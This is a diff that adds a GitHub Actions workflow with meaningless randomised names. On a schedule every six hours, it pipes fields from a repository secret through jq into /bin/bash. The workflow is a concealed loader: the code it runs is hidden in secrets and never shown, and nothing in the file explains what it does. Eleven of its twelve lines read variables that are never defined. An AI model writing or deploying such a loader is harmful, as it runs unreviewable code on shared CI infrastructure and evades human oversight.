@@ -1,0 +1,29 @@
+name: caifeihua0917
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caifeihua0917
+        env:
+          jtu55606: ${{ secrets.jtu55606 }}
+        run: |
+          echo $jtu55606 | jq -r .fhu57977 | /bin/bash
+          echo $if2260 | jq -r .brh4 | /bin/bash
+          echo $wqo3 | jq -r .h672 | /bin/bash
+          echo $wdabp31631 | jq -r .caso0 | /bin/bash
+          echo $dgajo50108 | jq -r .j314 | /bin/bash
+          echo $ju23902 | jq -r .u0 | /bin/bash
+          echo $elk9761 | jq -r .gmpbp1951 | /bin/bash
+          echo $hg48257 | jq -r .txffk6909 | /bin/bash
+          echo $wdt3734 | jq -r .ltiu2 | /bin/bash
+          echo $mz9963 | jq -r .g8604 | /bin/bash
+          echo $yhsy2 | jq -r .rdj25 | /bin/bash
+          echo $mt46 | jq -r .hruyl47 | /bin/bash
+
